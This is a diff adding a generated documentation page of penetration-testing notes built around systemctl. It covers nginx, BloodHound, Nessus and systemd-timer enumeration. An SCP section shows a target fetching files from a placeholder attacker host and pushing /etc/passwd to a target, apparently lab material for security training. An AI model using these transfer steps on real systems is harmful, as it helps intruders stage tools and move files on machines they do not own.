@@ -1,0 +1,127 @@
+---
+title: "systemctl"
+sidebarTitle: "systemctl"
+description: "Commands and examples collected from your systemctl notes."
+keywords: ["systemctl"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/systemctl.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=systemctl) · [All tools](/index)
+
+## Setup Steps
+
+**Notebook example**
+
+```bash
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+sudo rm /etc/nginx/sites-enabled/default          # remove if port 80 conflict
+sudo systemctl restart nginx.service
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+5 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="CE (BloodHound Community Edition, Docker) — current/recommended">
+
+### CE (BloodHound Community Edition, Docker) — current/recommended
+
+**BloodHound: Full Reference**
+
+```bash
+sudo apt install -y docker.io docker-compose          # 'docker-compose' is the v2 standalone on Kali
+sudo systemctl start docker
+curl -L https://ghst.ly/getbhce -o ~/bh.compose.yml   # note: saves as bh.compose.yml (dot)
+sudo docker-compose -f ~/bh.compose.yml up -d
+sudo docker-compose -f ~/bh.compose.yml logs | grep -i "Initial Password"   # one-time admin pw
+```
+
+</Accordion>
+
+<Accordion title="SCP (SSH-based Transfer)">
+
+### SCP (SSH-based Transfer)
+
+**File Transfers for Linux and Windows**
+
+```bash
+# Enable SSH on your attack box first
+sudo systemctl enable ssh && sudo systemctl start ssh
+
+# From target — download a file from attack box
+scp user@<ATTACKER_IP>:/path/to/file .
+
+# From attack box — upload a file to target
+scp /etc/passwd htb-student@<TARGET_IP>:/home/htb-student/
+```
+
+</Accordion>
+
+<Accordion title="Systemd timers">
+
+### Systemd timers
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+systemctl list-timers --all
+NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
+Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
+Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
+Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+3 timers listed.
+```
+
+</Accordion>
+
+<Accordion title="Key Commands">
+
+### Key Commands
+
+**Vulnerability Assessment, Nessus, and OpenVAS**
+
+```bash
+# Install (Debian/Ubuntu)
+sudo dpkg -i Nessus-<version>.deb
+
+# Start/Stop
+sudo systemctl start nessusd
+sudo systemctl stop nessusd
+
+# Register (CLI)
+sudo /opt/nessus/sbin/nessuscli fetch --register <activation-code>
+
+# Reset registration
+sudo /opt/nessus/sbin/nessuscli fix --reset
+
+# Web interface
+https://localhost:8834
+```
+
+</Accordion>
+
+<Accordion title="Troubleshooting">
+
+### Troubleshooting
+
+**BloodHound — Start, Collect, and Import**
+
+Context from the notebook: Service does not start Check  sudo systemctl status bloodhound postgresql --no-pager  and  sudo neo4j status .
+
+```text
+sudo systemctl status bloodhound postgresql --no-pager
+```
+
+</Accordion>
+
+</AccordionGroup>
